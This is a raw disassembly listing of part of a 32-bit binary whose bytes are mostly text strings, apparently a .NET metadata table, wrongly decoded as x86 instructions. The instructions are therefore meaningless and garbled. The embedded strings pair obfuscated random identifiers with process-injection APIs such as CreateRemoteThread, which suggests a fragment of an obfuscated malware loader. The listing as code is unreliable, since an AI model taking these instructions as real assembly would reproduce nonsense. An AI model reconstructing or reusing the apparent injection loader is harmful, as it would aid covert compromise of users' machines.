10002c17:	00 ce                	add    %cl,%dh
10002c19:	06                   	push   %es
10002c1a:	42                   	inc    %edx
10002c1b:	00 bb 00 d1 00 00    	add    %bh,0xd100(%ebx)
10002c21:	01 03                	add    %eax,(%ebx)
10002c23:	00 32                	add    %dh,(%edx)
10002c25:	04 01                	add    $0x1,%al
10002c27:	00 40 01             	add    %al,0x1(%eax)
10002c2a:	05 00 c1 03 01       	add    $0x103c100,%eax
10002c2f:	00 40 01             	add    %al,0x1(%eax)
10002c32:	07                   	pop    %es
10002c33:	00 73 08             	add    %dh,0x8(%ebx)
10002c36:	01 00                	add    %eax,(%eax)
10002c38:	40                   	inc    %eax
10002c39:	01 09                	add    %ecx,(%ecx)
10002c3b:	00 2d 09 01 00 40    	add    %ch,0x40000109
10002c41:	01 11                	add    %edx,(%ecx)
10002c43:	00 d3                	add    %dl,%bl
10002c45:	03 01                	add    (%ecx),%eax
10002c47:	00 40 01             	add    %al,0x1(%eax)
10002c4a:	13 00                	adc    (%eax),%eax
10002c4c:	89 09                	mov    %ecx,(%ecx)
10002c4e:	01 00                	add    %eax,(%eax)
10002c50:	04 80                	add    $0x80,%al
10002c52:	00 00                	add    %al,(%eax)
10002c54:	01 00                	add    %eax,(%eax)
	...
10002c62:	c8 02 00 00          	enter  $0x2,$0x0
10002c66:	04 00                	add    $0x0,%al
	...
10002c70:	00 00                	add    %al,(%eax)
10002c72:	28 01                	sub    %al,(%ecx)
10002c74:	75 03                	jne    0x10002c79
10002c76:	00 00                	add    %al,(%eax)
10002c78:	00 00                	add    %al,(%eax)
10002c7a:	04 00                	add    $0x0,%al
	...
10002c84:	00 00                	add    %al,(%eax)
10002c86:	28 01                	sub    %al,(%ecx)
10002c88:	03 07                	add    (%edi),%eax
10002c8a:	00 00                	add    %al,(%eax)
10002c8c:	00 00                	add    %al,(%eax)
10002c8e:	04 00                	add    $0x0,%al
	...
10002c98:	00 00                	add    %al,(%eax)
10002c9a:	28 01                	sub    %al,(%ecx)
10002c9c:	60                   	pusha
10002c9d:	04 00                	add    $0x0,%al
10002c9f:	00 00                	add    %al,(%eax)
10002ca1:	00 03                	add    %al,(%ebx)
10002ca3:	00 02                	add    %al,(%edx)
10002ca5:	00 04 00             	add    %al,(%eax,%eax,1)
10002ca8:	02 00                	add    (%eax),%al
10002caa:	05 00 02 00 06       	add    $0x6000200,%eax
10002caf:	00 02                	add    %al,(%edx)
10002cb1:	00 29                	add    %ch,(%ecx)
10002cb3:	00 3e                	add    %bh,(%esi)
10002cb5:	00 2d 00 67 00 2f    	add    %ch,0x2f006700
10002cbb:	00 79 00             	add    %bh,0x0(%ecx)
10002cbe:	33 00                	xor    (%eax),%eax
10002cc0:	97                   	xchg   %eax,%edi
10002cc1:	00 4d 00             	add    %cl,0x0(%ebp)
10002cc4:	3e 00 2f             	add    %ch,%ds:(%edi)
10002cc7:	00 3e                	add    %bh,(%esi)
10002cc9:	00 00                	add    %al,(%eax)
10002ccb:	00 00                	add    %al,(%eax)
10002ccd:	3c 3e                	cmp    $0x3e,%al
10002ccf:	39 5f 5f             	cmp    %ebx,0x5f(%edi)
10002cd2:	34 5f                	xor    $0x5f,%al
10002cd4:	30 00                	xor    %al,(%eax)
10002cd6:	3c 46                	cmp    $0x46,%al
10002cd8:	42                   	inc    %edx
10002cd9:	6d                   	insl   (%dx),%es:(%edi)
10002cda:	4b                   	dec    %ebx
10002cdb:	68 63 65 44 74       	push   $0x74446563
10002ce0:	31 4b 6d             	xor    %ecx,0x6d(%ebx)
10002ce3:	61                   	popa
10002ce4:	4d                   	dec    %ebp
10002ce5:	57                   	push   %edi
10002ce6:	73 43                	jae    0x10002d2b
10002ce8:	41                   	inc    %ecx
10002ce9:	72 47                	jb     0x10002d32
10002ceb:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
10002cef:	34 5f                	xor    $0x5f,%al
10002cf1:	30 00                	xor    %al,(%eax)
10002cf3:	3c 3e                	cmp    $0x3e,%al
10002cf5:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
10002cf8:	44                   	inc    %esp
10002cf9:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
10002d00:	6c                   	insb   (%dx),%es:(%edi)
10002d01:	61                   	popa
10002d02:	73 73                	jae    0x10002d77
10002d04:	36 5f                	ss pop %edi
10002d06:	30 00                	xor    %al,(%eax)
10002d08:	3c 59                	cmp    $0x59,%al
10002d0a:	58                   	pop    %eax
10002d0b:	7a 54                	jp     0x10002d61
10002d0d:	43                   	inc    %ebx
10002d0e:	46                   	inc    %esi
10002d0f:	33 55 45             	xor    0x45(%ebp),%edx
10002d12:	4a                   	dec    %edx
10002d13:	4f                   	dec    %edi
10002d14:	6e                   	outsb  %ds:(%esi),(%dx)
10002d15:	6a 5a                	push   $0x5a
10002d17:	41                   	inc    %ecx
10002d18:	53                   	push   %ebx
10002d19:	64 64 31 6c 49 73    	fs xor %ebp,%fs:0x73(%ecx,%ecx,2)
10002d1f:	79 47                	jns    0x10002d68
10002d21:	4d                   	dec    %ebp
10002d22:	3e 67 5f             	ds addr16 pop %edi
10002d25:	5f                   	pop    %edi
10002d26:	43                   	inc    %ebx
10002d27:	75 4c                	jne    0x10002d75
10002d29:	66 4f                	dec    %di
10002d2b:	7a 48                	jp     0x10002d75
10002d2d:	4b                   	dec    %ebx
10002d2e:	49                   	dec    %ecx
10002d2f:	4d                   	dec    %ebp
10002d30:	65 4e                	gs dec %esi
10002d32:	69 62 6b 66 7c 36 5f 	imul   $0x5f367c66,0x6b(%edx),%esp
10002d39:	30 00                	xor    %al,(%eax)
10002d3b:	3c 3e                	cmp    $0x3e,%al
10002d3d:	39 5f 5f             	cmp    %ebx,0x5f(%edi)
10002d40:	37                   	aaa
10002d41:	5f                   	pop    %edi
10002d42:	30 00                	xor    %al,(%eax)
10002d44:	3c 4d                	cmp    $0x4d,%al
10002d46:	4b                   	dec    %ebx
10002d47:	4c                   	dec    %esp
10002d48:	7a 62                	jp     0x10002dac
10002d4a:	73 75                	jae    0x10002dc1
10002d4c:	69 4f 70 65 6e 4f 4b 	imul   $0x4b4f6e65,0x70(%edi),%ecx
10002d53:	7a 79                	jp     0x10002dce
10002d55:	33 49 3e             	xor    0x3e(%ecx),%ecx
10002d58:	62 5f 5f             	bound  %ebx,0x5f(%edi)
10002d5b:	37                   	aaa
10002d5c:	5f                   	pop    %edi
10002d5d:	30 00                	xor    %al,(%eax)
10002d5f:	3c 59                	cmp    $0x59,%al
10002d61:	58                   	pop    %eax
10002d62:	7a 54                	jp     0x10002db8
10002d64:	43                   	inc    %ebx
10002d65:	46                   	inc    %esi
10002d66:	33 55 45             	xor    0x45(%ebp),%edx
10002d69:	4a                   	dec    %edx
10002d6a:	4f                   	dec    %edi
10002d6b:	6e                   	outsb  %ds:(%esi),(%dx)
10002d6c:	6a 5a                	push   $0x5a
10002d6e:	41                   	inc    %ecx
10002d6f:	53                   	push   %ebx
10002d70:	64 64 31 6c 49 73    	fs xor %ebp,%fs:0x73(%ecx,%ecx,2)
10002d76:	79 47                	jns    0x10002dbf
10002d78:	4d                   	dec    %ebp
10002d79:	3e 67 5f             	ds addr16 pop %edi
10002d7c:	5f                   	pop    %edi
10002d7d:	47                   	inc    %edi
10002d7e:	69 6c 49 77 50 52 70 	imul   $0x35705250,0x77(%ecx,%ecx,2),%ebp
10002d85:	35 
10002d86:	65 6c                	gs insb (%dx),%es:(%edi)
10002d88:	64 55                	fs push %ebp
10002d8a:	51                   	push   %ecx
10002d8b:	56                   	push   %esi
10002d8c:	7c 36                	jl     0x10002dc4
10002d8e:	5f                   	pop    %edi
10002d8f:	31 00                	xor    %eax,(%eax)
10002d91:	49                   	dec    %ecx
10002d92:	45                   	inc    %ebp
10002d93:	6e                   	outsb  %ds:(%esi),(%dx)
10002d94:	75 6d                	jne    0x10002e03
10002d96:	65 72 61             	gs jb  0x10002dfa
10002d99:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
10002d9d:	31 00                	xor    %eax,(%eax)
10002d9f:	4c                   	dec    %esp
10002da0:	69 73 74 60 31 00 3c 	imul   $0x3c003160,0x74(%ebx),%esi
10002da7:	59                   	pop    %ecx
10002da8:	58                   	pop    %eax
10002da9:	7a 54                	jp     0x10002dff
10002dab:	43                   	inc    %ebx
10002dac:	46                   	inc    %esi
10002dad:	33 55 45             	xor    0x45(%ebp),%edx
10002db0:	4a                   	dec    %edx
10002db1:	4f                   	dec    %edi
10002db2:	6e                   	outsb  %ds:(%esi),(%dx)
10002db3:	6a 5a                	push   $0x5a
10002db5:	41                   	inc    %ecx
10002db6:	53                   	push   %ebx
10002db7:	64 64 31 6c 49 73    	fs xor %ebp,%fs:0x73(%ecx,%ecx,2)
10002dbd:	79 47                	jns    0x10002e06
10002dbf:	4d                   	dec    %ebp
10002dc0:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
10002dc4:	32 00                	xor    (%eax),%al
10002dc6:	46                   	inc    %esi
10002dc7:	75 6e                	jne    0x10002e37
10002dc9:	63 60 32             	arpl   %esp,0x32(%eax)
10002dcc:	00 46 74             	add    %al,0x74(%esi)
10002dcf:	41                   	inc    %ecx
10002dd0:	4a                   	dec    %edx
10002dd1:	49                   	dec    %ecx
10002dd2:	53                   	push   %ebx
10002dd3:	45                   	inc    %ebp
10002dd4:	70 69                	jo     0x10002e3f
10002dd6:	65 71 46             	gs jno 0x10002e1f
10002dd9:	50                   	push   %eax
10002dda:	43                   	inc    %ebx
10002ddb:	7a 48                	jp     0x10002e25
10002ddd:	6f                   	outsl  %ds:(%esi),(%dx)
10002dde:	65 78 30             	gs js  0x10002e11
10002de1:	73 78                	jae    0x10002e5b
10002de3:	72 32                	jb     0x10002e17
10002de5:	00 5a 49             	add    %bl,0x49(%edx)
10002de8:	54                   	push   %esp
10002de9:	41                   	inc    %ecx
10002dea:	41                   	inc    %ecx
10002deb:	46                   	inc    %esi
10002dec:	54                   	push   %esp
10002ded:	6b 52 7a 39          	imul   $0x39,0x7a(%edx),%edx
10002df1:	36 56                	ss push %esi
10002df3:	78 32                	js     0x10002e27
10002df5:	00 4c 57 63          	add    %cl,0x63(%edi,%edx,2)
10002df9:	4f                   	dec    %edi
10002dfa:	41                   	inc    %ecx
10002dfb:	51                   	push   %ecx
10002dfc:	73 4a                	jae    0x10002e48
10002dfe:	65 74 6e             	gs je  0x10002e6f
10002e01:	6f                   	outsl  %ds:(%esi),(%dx)
10002e02:	56                   	push   %esi
10002e03:	35 00 54 53 65       	xor    $0x65535400,%eax
10002e08:	57                   	push   %edi
10002e09:	51                   	push   %ecx
10002e0a:	62 33                	bound  %esi,(%ebx)
10002e0c:	38 4f 52             	cmp    %cl,0x52(%edi)
10002e0f:	57                   	push   %edi
10002e10:	46                   	inc    %esi
10002e11:	58                   	pop    %eax
10002e12:	4d                   	dec    %ebp
10002e13:	36 00 67 65          	add    %ah,%ss:0x65(%edi)
10002e17:	74 5f                	je     0x10002e78
10002e19:	55                   	push   %ebp
10002e1a:	54                   	push   %esp
10002e1b:	46                   	inc    %esi
10002e1c:	38 00                	cmp    %al,(%eax)
10002e1e:	50                   	push   %eax
10002e1f:	4c                   	dec    %esp
10002e20:	45                   	inc    %ebp
10002e21:	7a 47                	jp     0x10002e6a
10002e23:	74 4d                	je     0x10002e72
10002e25:	48                   	dec    %eax
10002e26:	78 44                	js     0x10002e6c
10002e28:	63 75 73             	arpl   %esi,0x73(%ebp)
10002e2b:	31 39                	xor    %edi,(%ecx)
10002e2d:	00 3c 3e             	add    %bh,(%esi,%edi,1)
10002e30:	39 00                	cmp    %eax,(%eax)
10002e32:	44                   	inc    %esp
10002e33:	6e                   	outsb  %ds:(%esi),(%dx)
10002e34:	78 52                	js     0x10002e88
10002e36:	4d                   	dec    %ebp
10002e37:	55                   	push   %ebp
10002e38:	35 56 66 50 76       	xor    $0x76506656,%eax
10002e3d:	37                   	aaa
10002e3e:	56                   	push   %esi
10002e3f:	77 30                	ja     0x10002e71
10002e41:	67 30 32             	xor    %dh,(%bp,%si)
10002e44:	6a 46                	push   $0x46
10002e46:	6d                   	insl   (%dx),%es:(%edi)
10002e47:	45                   	inc    %ebp
10002e48:	39 00                	cmp    %eax,(%eax)
10002e4a:	3c 4d                	cmp    $0x4d,%al
10002e4c:	6f                   	outsl  %ds:(%esi),(%dx)
10002e4d:	64 75 6c             	fs jne 0x10002ebc
10002e50:	65 3e 00 53 79       	gs add %dl,%ds:0x79(%ebx)
10002e55:	75 56                	jne    0x10002ead
10002e57:	74 69                	je     0x10002ec2
10002e59:	6e                   	outsb  %ds:(%esi),(%dx)
10002e5a:	36 52                	ss push %edx
10002e5c:	53                   	push   %ebx
10002e5d:	62 53 38             	bound  %edx,0x38(%ebx)
10002e60:	55                   	push   %ebp
10002e61:	49                   	dec    %ecx
10002e62:	30 35 39 52 5a 42    	xor    %dh,0x425a5239
10002e68:	00 4e 5a             	add    %cl,0x5a(%esi)
10002e6b:	57                   	push   %edi
10002e6c:	5a                   	pop    %edx
10002e6d:	62 59 42             	bound  %ebx,0x42(%ecx)
10002e70:	45                   	inc    %ebp
10002e71:	6c                   	insb   (%dx),%es:(%edi)
10002e72:	31 6c 66 64          	xor    %ebp,0x64(%esi,%eiz,2)
10002e76:	45                   	inc    %ebp
10002e77:	47                   	inc    %edi
10002e78:	61                   	popa
10002e79:	61                   	popa
10002e7a:	66 42                	inc    %dx
10002e7c:	00 42 57             	add    %al,0x57(%edx)
10002e7f:	42                   	inc    %edx
10002e80:	44                   	inc    %esp
10002e81:	53                   	push   %ebx
10002e82:	50                   	push   %eax
10002e83:	77 6c                	ja     0x10002ef1
10002e85:	76 37                	jbe    0x10002ebe
10002e87:	67 71 47             	addr16 jno 0x10002ed1
10002e8a:	36 33 4b 65          	xor    %ss:0x65(%ebx),%ecx
10002e8e:	79 4b                	jns    0x10002edb
10002e90:	69 76 6e 44 00 4d 42 	imul   $0x424d0044,0x6e(%esi),%esi
10002e97:	4c                   	dec    %esp
10002e98:	53                   	push   %ebx
10002e99:	48                   	dec    %eax
10002e9a:	74 6c                	je     0x10002f08
10002e9c:	4b                   	dec    %ebx
10002e9d:	6c                   	insb   (%dx),%es:(%edi)
10002e9e:	73 7a                	jae    0x10002f1a
10002ea0:	6b 30 45             	imul   $0x45,(%eax),%esi
10002ea3:	00 46 74             	add    %al,0x74(%esi)
10002ea6:	6e                   	outsb  %ds:(%esi),(%dx)
10002ea7:	4e                   	dec    %esi
10002ea8:	76 6d                	jbe    0x10002f17
10002eaa:	31 56 57             	xor    %edx,0x57(%esi)
10002ead:	32 49 45             	xor    0x45(%ecx),%cl
10002eb0:	63 44 65 41          	arpl   %eax,0x41(%ebp,%eiz,2)
10002eb4:	39 77 57             	cmp    %esi,0x57(%edi)
10002eb7:	50                   	push   %eax
10002eb8:	31 45 45             	xor    %eax,0x45(%ebp)
10002ebb:	00 46 42             	add    %al,0x42(%esi)
10002ebe:	6d                   	insl   (%dx),%es:(%edi)
10002ebf:	4b                   	dec    %ebx
10002ec0:	68 63 65 44 74       	push   $0x74446563
10002ec5:	31 4b 6d             	xor    %ecx,0x6d(%ebx)
10002ec8:	61                   	popa
10002ec9:	4d                   	dec    %ebp
10002eca:	57                   	push   %edi
10002ecb:	73 43                	jae    0x10002f10
10002ecd:	41                   	inc    %ecx
10002ece:	72 47                	jb     0x10002f17
10002ed0:	00 4d 4b             	add    %cl,0x4b(%ebp)
10002ed3:	4c                   	dec    %esp
10002ed4:	7a 62                	jp     0x10002f38
10002ed6:	73 75                	jae    0x10002f4d
10002ed8:	69 4f 70 65 6e 4f 4b 	imul   $0x4b4f6e65,0x70(%edi),%ecx
10002edf:	7a 79                	jp     0x10002f5a
10002ee1:	33 49 00             	xor    0x0(%ecx),%ecx
10002ee4:	51                   	push   %ecx
10002ee5:	45                   	inc    %ebp
10002ee6:	53                   	push   %ebx
10002ee7:	4a                   	dec    %edx
10002ee8:	4c                   	dec    %esp
10002ee9:	6e                   	outsb  %ds:(%esi),(%dx)
10002eea:	59                   	pop    %ecx
10002eeb:	32 62 56             	xor    0x56(%edx),%ah
10002eee:	39 49 44             	cmp    %ecx,0x44(%ecx)
10002ef1:	45                   	inc    %ebp
10002ef2:	41                   	inc    %ecx
10002ef3:	63 52 58             	arpl   %edx,0x58(%edx)
10002ef6:	73 52                	jae    0x10002f4a
10002ef8:	62 37                	bound  %esi,(%edi)
10002efa:	50                   	push   %eax
10002efb:	4b                   	dec    %ebx
10002efc:	00 57 6e             	add    %dl,0x6e(%edi)
10002eff:	45                   	inc    %ebp
10002f00:	4c                   	dec    %esp
10002f01:	79 68                	jns    0x10002f6b
10002f03:	4a                   	dec    %edx
10002f04:	65 79 4a             	gs jns 0x10002f51
10002f07:	65 53                	gs push %ebx
10002f09:	33 75 72             	xor    0x72(%ebp),%esi
10002f0c:	72 57                	jb     0x10002f65
10002f0e:	4b                   	dec    %ebx
10002f0f:	00 5a 59             	add    %bl,0x59(%edx)
10002f12:	62 69 65             	bound  %ebp,0x65(%ecx)
10002f15:	55                   	push   %ebp
10002f16:	50                   	push   %eax
10002f17:	4f                   	dec    %edi
10002f18:	56                   	push   %esi
10002f19:	34 58                	xor    $0x58,%al
10002f1b:	62 55 79             	bound  %edx,0x79(%ebp)
10002f1e:	59                   	pop    %ecx
10002f1f:	37                   	aaa
10002f20:	62 4c 00 59          	bound  %ecx,0x59(%eax,%eax,1)
10002f24:	58                   	pop    %eax
10002f25:	7a 54                	jp     0x10002f7b
10002f27:	43                   	inc    %ebx
10002f28:	46                   	inc    %esi
10002f29:	33 55 45             	xor    0x45(%ebp),%edx
10002f2c:	4a                   	dec    %edx
10002f2d:	4f                   	dec    %edi
10002f2e:	6e                   	outsb  %ds:(%esi),(%dx)
10002f2f:	6a 5a                	push   $0x5a
10002f31:	41                   	inc    %ecx
10002f32:	53                   	push   %ebx
10002f33:	64 64 31 6c 49 73    	fs xor %ebp,%fs:0x73(%ecx,%ecx,2)
10002f39:	79 47                	jns    0x10002f82
10002f3b:	4d                   	dec    %ebp
10002f3c:	00 58 6d             	add    %bl,0x6d(%eax)
10002f3f:	70 73                	jo     0x10002fb4
10002f41:	48                   	dec    %eax
10002f42:	71 4e                	jno    0x10002f92
10002f44:	44                   	inc    %esp
10002f45:	62 67 63             	bound  %esp,0x63(%edi)
10002f48:	30 36                	xor    %dh,(%esi)
10002f4a:	6e                   	outsb  %ds:(%esi),(%dx)
10002f4b:	4b                   	dec    %ebx
10002f4c:	39 43 65             	cmp    %eax,0x65(%ebx)
10002f4f:	78 51                	js     0x10002fa2
10002f51:	69 4d 00 50 52 4f 43 	imul   $0x434f5250,0x0(%ebp),%ecx
10002f58:	45                   	inc    %ebp
10002f59:	53                   	push   %ebx
10002f5a:	53                   	push   %ebx
10002f5b:	5f                   	pop    %edi
10002f5c:	49                   	dec    %ecx
10002f5d:	4e                   	dec    %esi
10002f5e:	46                   	inc    %esi
10002f5f:	4f                   	dec    %edi
10002f60:	52                   	push   %edx
10002f61:	4d                   	dec    %ebp
10002f62:	41                   	inc    %ecx
10002f63:	54                   	push   %esp
10002f64:	49                   	dec    %ecx
10002f65:	4f                   	dec    %edi
10002f66:	4e                   	dec    %esi
10002f67:	00 53 54             	add    %dl,0x54(%ebx)
10002f6a:	41                   	inc    %ecx
10002f6b:	52                   	push   %edx
10002f6c:	54                   	push   %esp
10002f6d:	55                   	push   %ebp
10002f6e:	50                   	push   %eax
10002f6f:	49                   	dec    %ecx
10002f70:	4e                   	dec    %esi
10002f71:	46                   	inc    %esi
10002f72:	4f                   	dec    %edi
10002f73:	00 53 79             	add    %dl,0x79(%ebx)
10002f76:	73 74                	jae    0x10002fec
10002f78:	65 6d                	gs insl (%dx),%es:(%edi)
10002f7a:	2e 49                	cs dec %ecx
10002f7c:	4f                   	dec    %edi
10002f7d:	00 59 68             	add    %bl,0x68(%ecx)
10002f80:	50                   	push   %eax
10002f81:	46                   	inc    %esi
10002f82:	48                   	dec    %eax
10002f83:	4b                   	dec    %ebx
10002f84:	4f                   	dec    %edi
10002f85:	42                   	inc    %edx
10002f86:	4d                   	dec    %ebp
10002f87:	43                   	inc    %ebx
10002f88:	67 53                	addr16 push %ebx
10002f8a:	35 63 62 36 35       	xor    $0x35366263,%eax
10002f8f:	51                   	push   %ecx
10002f90:	63 36                	arpl   %esi,(%esi)
10002f92:	50                   	push   %eax
10002f93:	00 42 76             	add    %al,0x76(%edx)
10002f96:	61                   	popa
10002f97:	43                   	inc    %ebx
10002f98:	52                   	push   %edx
10002f99:	67 4b                	addr16 dec %ebx
10002f9b:	50                   	push   %eax
10002f9c:	71 6c                	jno    0x1000300a
10002f9e:	4d                   	dec    %ebp
10002f9f:	57                   	push   %edi
10002fa0:	65 50                	gs push %eax
10002fa2:	00 49 57             	add    %cl,0x57(%ecx)
10002fa5:	41                   	inc    %ecx
10002fa6:	54                   	push   %esp
10002fa7:	46                   	inc    %esi
10002fa8:	57                   	push   %edi
10002fa9:	6a 5a                	push   $0x5a
10002fab:	6a 70                	push   $0x70
10002fad:	42                   	inc    %edx
10002fae:	39 77 78             	cmp    %esi,0x78(%edi)
10002fb1:	35 49 52 00 44       	xor    $0x44005249,%eax
10002fb6:	59                   	pop    %ecx
10002fb7:	77 7a                	ja     0x10003033
10002fb9:	4c                   	dec    %esp
10002fba:	63 4f 57             	arpl   %ecx,0x57(%edi)
10002fbd:	74 39                	je     0x10002ff8
10002fbf:	76 6e                	jbe    0x1000302f
10002fc1:	34 35                	xor    $0x35,%al
10002fc3:	47                   	inc    %edi
10002fc4:	72 31                	jb     0x10002ff7
10002fc6:	76 33                	jbe    0x10002ffb
10002fc8:	53                   	push   %ebx
10002fc9:	00 4c 46 6c          	add    %cl,0x6c(%esi,%eax,2)
10002fcd:	71 70                	jno    0x1000303f
10002fcf:	75 62                	jne    0x10003033
10002fd1:	32 74 6c 70          	xor    0x70(%esp,%ebp,2),%dh
10002fd5:	4b                   	dec    %ebx
10002fd6:	6e                   	outsb  %ds:(%esi),(%dx)
10002fd7:	53                   	push   %ebx
10002fd8:	00 4f 78             	add    %cl,0x78(%edi)
10002fdb:	58                   	pop    %eax
10002fdc:	4a                   	dec    %edx
10002fdd:	71 43                	jno    0x10003022
10002fdf:	4b                   	dec    %ebx
10002fe0:	49                   	dec    %ecx
10002fe1:	51                   	push   %ecx
10002fe2:	6c                   	insb   (%dx),%es:(%edi)
10002fe3:	4f                   	dec    %edi
10002fe4:	49                   	dec    %ecx
10002fe5:	75 69                	jne    0x10003050
10002fe7:	72 55                	jb     0x1000303e
10002fe9:	00 50 6d             	add    %dl,0x6d(%eax)
10002fec:	6d                   	insl   (%dx),%es:(%edi)
10002fed:	43                   	inc    %ebx
10002fee:	52                   	push   %edx
10002fef:	71 48                	jno    0x10003039
10002ff1:	56                   	push   %esi
10002ff2:	71 58                	jno    0x1000304c
10002ff4:	4d                   	dec    %ebp
10002ff5:	4c                   	dec    %esp
10002ff6:	4f                   	dec    %edi
10002ff7:	55                   	push   %ebp
10002ff8:	69 48 56 00 4a 77 4a 	imul   $0x4a774a00,0x56(%eax),%ecx
10002fff:	64 54                	fs push %esp
10003001:	58                   	pop    %eax
10003002:	50                   	push   %eax
10003003:	4e                   	dec    %esi
10003004:	42                   	inc    %edx
10003005:	56                   	push   %esi
10003006:	4a                   	dec    %edx
10003007:	70 69                	jo     0x10003072
10003009:	58                   	pop    %eax
1000300a:	00 57 42             	add    %dl,0x42(%edi)
1000300d:	6b 4a 6a 4a          	imul   $0x4a,0x6a(%edx),%ecx
10003011:	53                   	push   %ebx
10003012:	52                   	push   %edx
10003013:	33 70 53             	xor    0x53(%eax),%esi
10003016:	69 46 66 78 69 58 00 	imul   $0x586978,0x66(%esi),%eax
1000301d:	64 77 58             	fs ja  0x10003078
10003020:	00 64 77 59          	add    %ah,0x59(%edi,%esi,2)
10003024:	00 4f 72             	add    %cl,0x72(%edi)
10003027:	5a                   	pop    %edx
10003028:	46                   	inc    %esi
10003029:	4f                   	dec    %edi
1000302a:	4b                   	dec    %ebx
1000302b:	68 6a 4f 51 45       	push   $0x45514f6a
10003030:	66 67 62 65 45       	bound  %sp,0x45(%di)
10003035:	38 43 58             	cmp    %al,0x58(%ebx)
10003038:	4a                   	dec    %edx
10003039:	71 33                	jno    0x1000306e
1000303b:	42                   	inc    %edx
1000303c:	61                   	popa
1000303d:	00 63 62             	add    %ah,0x62(%ebx)
10003040:	00 6d 73             	add    %ch,0x73(%ebp)
10003043:	63 6f 72             	arpl   %ebp,0x72(%edi)
10003046:	6c                   	insb   (%dx),%es:(%edi)
10003047:	69 62 00 3c 3e 63 00 	imul   $0x633e3c,0x0(%edx),%esp
1000304e:	53                   	push   %ebx
1000304f:	79 73                	jns    0x100030c4
10003051:	74 65                	je     0x100030b8
10003053:	6d                   	insl   (%dx),%es:(%edi)
10003054:	2e 43                	cs inc %ebx
10003056:	6f                   	outsl  %ds:(%esi),(%dx)
10003057:	6c                   	insb   (%dx),%es:(%edi)
10003058:	6c                   	insb   (%dx),%es:(%edi)
10003059:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
1000305e:	6e                   	outsb  %ds:(%esi),(%dx)
1000305f:	73 2e                	jae    0x1000308f
10003061:	47                   	inc    %edi
10003062:	65 6e                	outsb  %gs:(%esi),(%dx)
10003064:	65 72 69             	gs jb  0x100030d0
10003067:	63 00                	arpl   %eax,(%eax)
10003069:	41                   	inc    %ecx
1000306a:	41                   	inc    %ecx
1000306b:	51                   	push   %ecx
1000306c:	79 70                	jns    0x100030de
1000306e:	71 47                	jno    0x100030b7
10003070:	37                   	aaa
10003071:	43                   	inc    %ebx
10003072:	53                   	push   %ebx
10003073:	39 7a 65             	cmp    %edi,0x65(%edx)
10003076:	66 6f                	outsw  %ds:(%esi),(%dx)
10003078:	30 37                	xor    %dh,(%edi)
1000307a:	6d                   	insl   (%dx),%es:(%edi)
1000307b:	72 63                	jb     0x100030e0
1000307d:	00 47 65             	add    %al,0x65(%edi)
10003080:	74 50                	je     0x100030d2
10003082:	72 6f                	jb     0x100030f3
10003084:	63 65 73             	arpl   %esp,0x73(%ebp)
10003087:	73 42                	jae    0x100030cb
10003089:	79 49                	jns    0x100030d4
1000308b:	64 00 47 65          	add    %al,%fs:0x65(%edi)
1000308f:	74 45                	je     0x100030d6
10003091:	78 69                	js     0x100030fc
10003093:	74 43                	je     0x100030d8
10003095:	6f                   	outsl  %ds:(%esi),(%dx)
10003096:	64 65 54             	fs gs push %esp
10003099:	68 72 65 61 64       	push   $0x64616572
1000309e:	00 43 72             	add    %al,0x72(%ebx)
100030a1:	65 61                	gs popa
100030a3:	74 65                	je     0x1000310a
100030a5:	52                   	push   %edx
100030a6:	65 6d                	gs insl (%dx),%es:(%edi)
100030a8:	6f                   	outsl  %ds:(%esi),(%dx)
100030a9:	74 65                	je     0x10003110
100030ab:	54                   	push   %esp
100030ac:	68 72 65 61 64       	push   $0x64616572
100030b1:	00 41 57             	add    %al,0x57(%ecx)
100030b4:	52                   	push   %edx
100030b5:	45                   	inc    %ebp
100030b6:	5a                   	pop    %edx
100030b7:	4b                   	dec    %ebx
100030b8:	6c                   	insb   (%dx),%es:(%edi)
100030b9:	48                   	dec    %eax
100030ba:	42                   	inc    %edx
100030bb:	54                   	push   %esp
100030bc:	4b                   	dec    %ebx
100030bd:	32 69 63             	xor    0x63(%ecx),%ch
100030c0:	64 00 41 64          	add    %al,%fs:0x64(%ecx)
100030c4:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
100030c8:	74 5f                	je     0x10003129
100030ca:	48                   	dec    %eax
100030cb:	61                   	popa
100030cc:	73 45                	jae    0x10003113
100030ce:	78 69                	js     0x10003139
100030d0:	74 65                	je     0x10003137
100030d2:	64 00 43 6f          	add    %al,%fs:0x6f(%ebx)
100030d6:	6e                   	outsb  %ds:(%esi),(%dx)
100030d7:	63 6b 55             	arpl   %ebp,0x55(%ebx)
100030da:	56                   	push   %esi
100030db:	41                   	inc    %ecx
100030dc:	55                   	push   %ebp
100030dd:	46                   	inc    %esi
100030de:	4b                   	dec    %ebx
100030df:	32 58 4e             	xor    0x4e(%eax),%bl
100030e2:	77 6c                	ja     0x10003150
100030e4:	6a 49                	push   $0x49
100030e6:	6e                   	outsb  %ds:(%esi),(%dx)
100030e7:	4a                   	dec    %edx
100030e8:	39 65 00             	cmp    %esp,0x0(%ebp)
100030eb:	52                   	push   %edx
100030ec:	65 70 6c             	gs jo  0x1000315b
100030ef:	61                   	popa
100030f0:	63 65 00             	arpl   %esp,0x0(%ebp)
100030f3:	45                   	inc    %ebp
100030f4:	6e                   	outsb  %ds:(%esi),(%dx)
100030f5:	75 6d                	jne    0x10003164
100030f7:	65 72 61             	gs jb  0x1000315b
100030fa:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
100030fe:	43                   	inc    %ebx
100030ff:	6c                   	insb   (%dx),%es:(%edi)
10003100:	6f                   	outsl  %ds:(%esi),(%dx)
10003101:	73 65                	jae    0x10003168
10003103:	48                   	dec    %eax
10003104:	61                   	popa
10003105:	6e                   	outsb  %ds:(%esi),(%dx)
10003106:	64 6c                	fs insb (%dx),%es:(%edi)
10003108:	65 00 46 69          	add    %al,%gs:0x69(%esi)
1000310c:	6c                   	insb   (%dx),%es:(%edi)
1000310d:	65 00 66 69          	add    %ah,%gs:0x69(%esi)
10003111:	6c                   	insb   (%dx),%es:(%edi)
10003112:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
10003116:	6d                   	insl   (%dx),%es:(%edi)
10003117:	62 69 6e             	bound  %ebp,0x6e(%ecx)
